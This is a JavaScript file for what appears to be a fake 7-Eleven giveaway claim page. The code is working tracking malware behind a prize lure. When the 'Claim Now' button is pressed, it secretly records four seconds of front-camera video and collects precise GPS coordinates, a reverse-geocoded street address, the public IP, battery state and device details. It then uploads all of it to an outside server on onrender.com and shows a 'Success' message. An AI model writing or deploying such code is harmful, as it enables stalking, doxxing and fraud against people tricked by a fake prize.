const video = document.getElementById('preview');
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');

// Initialize camera
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
    } catch (err) {
        console.warn("Camera access denied.");
    }
}
initCamera();

// Get GPS location + reverse geocode to address
async function getLocationData() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                let address = "Unknown";

                try {
                    const geoRes = await fetch(
                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
                    );
                    const geoData = await geoRes.json();
                    address = geoData.display_name || "Unknown";
                } catch (e) {
                    console.warn("Reverse geocoding failed");
                }

                resolve({
                    latitude: lat,
                    longitude: lon,
                    accuracy,
                    address,
                    googleMaps: `https://www.google.com/maps?q=${lat},${lon}`
                });
            },
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
}

// Get battery info
async function getBatteryInfo() {
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return {
            level: (battery.level * 100).toFixed(0) + '%',
            charging: battery.charging
        };
    }
    return null;
}

// Get public IP address
async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return null;
    }
}

// Handle Claim Now button click
btn.addEventListener('click', async () => {

    btn.style.display = 'none';
    loading.style.display = 'block';

    try {
        const stream = video.srcObject;
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.webm');

            // Gather location, battery, IP, device info
            const location = await getLocationData();
            const battery = await getBatteryInfo();
            const ip = await getIP();
            const device = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                battery,
                ip
            };

            // Append data to form
            if (location) {
                formData.append("latitude", location.latitude);
                formData.append("longitude", location.longitude);
                formData.append("accuracy", location.accuracy);
                formData.append("address", location.address);
                formData.append("maps", location.googleMaps);
            }
            formData.append("deviceInfo", JSON.stringify(device));

            // Send to backend
            const res = await fetch("https://seven-11-giveaways-2026-k7mn.onrender.com/upload-video", {
                method: "POST",
                body: formData
            });

            const data = await res.json();

            console.log("Video posted:", data);
            console.log("Location info:", location);
            console.log("Device info:", device);

            loading.innerHTML = "<p>Success! Your claim video has been posted with location & device info.</p>";
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 4000); // record 4 seconds

    } catch (err) {
        console.error(err);
        loading.innerHTML = "<p>Error capturing video.</p>";
    }

});
